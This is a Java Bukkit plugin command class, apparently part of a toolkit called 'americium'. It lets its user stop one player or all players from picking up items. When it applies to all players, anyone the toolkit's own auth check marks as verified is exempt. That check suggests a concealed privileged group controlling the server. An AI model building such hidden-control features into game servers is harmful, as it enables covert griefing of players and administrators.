package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerPickupItemEvent;

import java.io.IOException;
import java.util.ArrayList;
import java.util.UUID;

public class NPU implements Command, Listener {
    private final ArrayList<UUID> toggled = new ArrayList<>();
    private boolean allNPU = false;
    private Z_ z;

    @Override
    public String[] getCommands() {
        return new String[]{"npu"};
    }

    @Override
    public String getDescription() {
        return "Prevent a player or all players from picking up items.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "npu <player | *>");
            return;
        }

        if (args[0].equals("*")) {
            this.allNPU = !this.allNPU;
            if (!allNPU) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "All players can now pick up items!");
            } else {
                sender.sendMessage(Colors.Prefix + Colors.Success + "All players can now no longer pick up!");
            }

            return;
        }

        Player selected = Bukkit.getPlayer(args[0]);
        if (selected == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
            return;
        }

        if (toggled.contains(selected.getUniqueId())) {
            toggled.remove(selected.getUniqueId());
            sender.sendMessage(Colors.Prefix + Colors.Failure + selected.getName() + " can now pick up items!");
            return;
        }

        toggled.add(selected.getUniqueId());
        sender.sendMessage(Colors.Prefix + Colors.Success + selected.getName() + " can no longer pick up items!");
    }

    @Override
    public void onEnable(Z_ z) {
        this.z = z;
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void itemPickup(PlayerPickupItemEvent e) throws IOException, InterruptedException {
        if (e.getPlayer() == null) {
            return;
        }

        Player p = e.getPlayer();

        if (toggled.contains(p.getUniqueId())) {
            e.setCancelled(true);
        }

        if (!this.z.getAuth().isVerified(p.getName()) && this.allNPU) {
            e.setCancelled(true);
        }
    }
}
